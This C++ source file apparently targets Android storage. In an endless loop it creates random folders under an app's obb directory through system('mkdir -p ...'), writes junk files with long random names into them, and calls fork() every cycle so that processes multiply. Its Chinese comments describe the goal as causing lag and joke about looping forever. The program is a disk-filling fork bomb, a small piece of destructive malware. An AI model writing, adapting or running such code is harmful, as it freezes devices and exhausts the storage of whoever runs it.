#include <cstdlib>
#import <iostream>
#import <fstream>//文件读写
#import <random>//随机
#import <string>//字符串
#import <thread>//多线程
#import <future>//多线程
#import <unistd.h>
#import <sys/types.h>

using namespace std;
#define nNum 256
string filename=".";
string foldername;
string str="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghipqrstuvwxyz<>\\=^$(){}[]&;/~%*|-+""“：，。！、；‘（～《〈*〔［【——·｀#￥%ˇ•+=｛ˉ¨．｜〃‖々「『〖∶＇＂／＊＆＼＃＄％︿＿＋－＝＜.@……&-〗』」｝】］〕〉》）’”";
random_device rd;default_random_engine f(rd());
string dir;
int random_name(){//随机名字
  filename=".";
  string temp;
  for(auto i=0;i<nNum;i++){
    filename+=str[f()%str.size()];
    temp="/sdcard/Android/obb/com.nglsg/";//这只是个测试请修改此处
    temp+=str[f()%40];
    string cmd="mkdir -p " + temp;
    system(cmd.c_str());
  }
  foldername=temp;
  dir=foldername+"/"+filename;
  cout<<dir<<endl;
  return 0;
}
int write_rom(unsigned int dn){
  random_name();
  fstream fs(dir,ios::out | ios::app);
  for(auto i=0;i<dn;i++)//必须为正数
  {
    fs<<str[f()%str.size()]<<endl;
  }
  fs.close();
  return 0;
}
int pause(){//卡顿
  pid_t id = fork();
  if(id==0){
  }
  return 0;
}

int main()
{
  while(true){//写入次数建议while循环(滑稽)
    cout<<"isRuning!\n";
    future<int> fu1 =async(write_rom,1000);
    future<int> fu2 =async(pause);
    fu1.get();
    fu2.get();
  }
  return 0;
}

